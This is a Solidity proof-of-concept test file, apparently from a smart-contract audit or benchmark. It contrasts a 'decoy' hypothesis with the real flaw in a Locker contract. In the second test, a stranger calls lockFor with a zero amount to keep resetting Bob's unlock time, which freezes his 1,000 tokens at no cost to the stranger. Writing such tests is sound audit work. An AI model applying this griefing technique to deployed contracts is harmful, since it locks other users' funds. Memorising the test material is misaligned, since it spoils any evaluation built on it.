// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Proof} from "proof/Vm.sol";
import {Locker} from "../src/Locker.sol";

// Unmodified OpenZeppelin 5.4.0 ERC20; mint is exposed for the setup only.
contract Token is ERC20("Token", "TKN") {
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract LockerProof is Proof {
    Locker locker;
    Token[5] toks;
    address bob = address(0xB0B);
    address stranger = address(0x5757);

    function setUp() public {
        vm.warp(1_000_000);
        locker = new Locker();
        for (uint256 i; i < 5; i++) {
            toks[i] = new Token();
            locker.list(IERC20(address(toks[i])));
        }
        toks[0].mint(bob, 1000e18);
        vm.startPrank(bob);
        toks[0].approve(address(locker), type(uint256).max);
        locker.lockFor(bob, 0, 1000e18);   // Bob locks 1,000 of token 0 for himself
        vm.stopPrank();
    }

    // Decoy: the loop is capped at five admin-listed tokens, and OpenZeppelin ERC20 accepts
    // zero-value transfers, so unlock with four never-locked tokens succeeds cheaply.
    function test_decoy_cappedLoopWithZeroTransfersUnlocks() public {
        Token sixth = new Token();
        vm.expectRevert();
        locker.list(IERC20(address(sixth)));   // a sixth token cannot be listed
        assertEq(locker.unlockAt(bob), 1_000_000 + 30 days, "30-day lock");

        vm.warp(1_000_000 + 30 days);
        vm.prank(bob);
        uint256 g = gasleft();
        locker.unlock();
        uint256 used = g - gasleft();
        assertEq(toks[0].balanceOf(bob), 1000e18, "Bob got his tokens back");
        assertEq(locker.locked(bob, 0), 0, "lock cleared");
        assertTrue(used < 200_000, "five iterations cost well under any block limit");
    }

    // Real cause: lockFor lets anyone reset another user's unlockAt, even with amount 0
    // (OpenZeppelin transferFrom of 0 needs no allowance), so Bob's tokens never unlock.
    function test_loss_strangerKeepsResettingBobsUnlock() public {
        for (uint256 k = 1; k <= 3; k++) {
            vm.warp(1_000_000 + k * 29 days);
            vm.prank(stranger);
            locker.lockFor(bob, 0, 0);       // costs the stranger no tokens
        }
        vm.warp(1_000_000 + 90 days);
        vm.prank(bob);
        vm.expectRevert(bytes("locked"));
        locker.unlock();
        assertEq(locker.unlockAt(bob), 1_000_000 + 87 days + 30 days, "pushed back again");
        assertEq(toks[0].balanceOf(stranger), 0, "stranger spent nothing");
        assertEq(toks[0].balanceOf(address(locker)), 1000e18, "Bob's 1,000 tokens still held");
    }
}
